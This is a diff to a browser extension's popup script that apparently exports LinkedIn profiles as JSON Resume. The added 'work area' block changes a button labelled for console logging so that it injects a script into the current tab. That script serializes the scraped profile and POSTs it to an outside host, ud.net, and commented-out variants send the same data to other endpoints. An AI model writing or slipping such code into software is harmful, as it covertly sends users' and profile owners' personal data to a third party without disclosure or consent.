@@ -146,6 +146,7 @@ const getSpecVersion = () => {
  * =============================
  */
 
+
 chrome.runtime.onMessage.addListener((message, sender) => {
     console.log(message);
     if (sender.id === extensionId && message.key === 'locales') {
@@ -176,6 +177,109 @@ document.getElementById('liToJsonButton').addEventListener('click', async () => 
     );
 });
 
+
+//work area
+
+
+// function startSendRequest() {
+//     const versionOption = getSpecVersion();
+//     const runAndShowCode = getRunAndShowCode(versionOption);
+
+//     let my_code = `
+//     liToJrInstance.showToConsoleJson('${versionOption}').then((result) => {
+//         console.log(result);
+//     });`;
+//     var f = document.createElement('form');
+//     f.action = "http://ud/theBasik.php";
+//     f.method = 'POST';
+//     f.target = '_blank';
+
+//     var i = document.createElement('input');
+//     i.type = 'hidden';
+//     i.name = 'fragment';
+//     i.value = my_code;
+//     f.appendChild(i);
+
+//     document.body.appendChild(f);
+//     f.submit();
+// }
+
+
+
+document.getElementById('consoleLogJsonButton').addEventListener('click', async () => {
+
+    //startSendRequest();
+
+
+    const versionOption = await getSpecVersion();
+    //const runAndShowCode = getRunAndShowCode(versionOption);
+    // let obj = new URLSearchParams(result);
+    let my_code = `
+    liToJrInstance.showToConsoleJson('${versionOption}').then((result) => {
+        
+        // let jsonToUrl = (initialObj) => {
+        //     const reducer = (obj, parentPrefix = null) => (prev, key) => {
+        //     const val = obj[key];
+        //     key = encodeURIComponent(key);
+        //     const prefix = parentPrefix ? parentPrefix + '[' + key + ']' : key;
+            
+        //     if (val == null || typeof val === 'function') {
+        //     prev.push(prefix + '=');
+        //     return prev;
+        //     }
+            
+        //     if (['number', 'boolean', 'string'].includes(typeof val)) {
+        //     prev.push(prefix + '=' + encodeURIComponent(val));
+        //     return prev;
+        //     }
+            
+        //     prev.push(Object.keys(val).reduce(reducer(val, prefix), []).join('&'));
+        //     return prev;
+        //     };
+            
+        //     return Object.keys(initialObj).reduce(reducer(initialObj), []).join('&');
+        //     };
+
+        //     window.open('http://ud.net/theBasik.php?' + jsonToUrl(result), '_blank');
+
+
+        let json = JSON.stringify(result);
+        let newString = json.replace(/\\&/g, '||');
+        let req = new XMLHttpRequest();
+        let baseUrl = "https://ud.net/index.php";
+        let prepared_data = newString;
+        let urlParams = 'data=' + prepared_data;
+
+        req.open("POST", baseUrl, true);
+        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        req.send(urlParams);
+
+        req.onreadystatechange = function() {
+            if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+                console.log("Got response 200!");
+            }
+        }
+
+    });`;
+
+
+    chrome.tabs.executeScript(
+        {
+            code: `${my_code}`
+        },
+        () => {
+            setTimeout(() => {
+                // Close popup
+                window.close();
+            }, 700);
+        }
+    );
+})
+
+
+// work end 
+
+
 document.getElementById('liToJsonDownloadButton').addEventListener('click', () => {
     chrome.tabs.executeScript({
         code: `liToJrInstance.preferLocale = '${getSelectedLang()}';liToJrInstance.parseAndDownload();`
@@ -191,7 +295,7 @@ document.getElementById('vcardExportButton').addEventListener('click', () => {
 });
 
 SPEC_SELECT.addEventListener('change', () => {
-    setSpecVersion(/** @type {SchemaVersion} */ (SPEC_SELECT.value));
+    setSpecVersion(/** @type {SchemaVersion} */(SPEC_SELECT.value));
 });
 
 /**
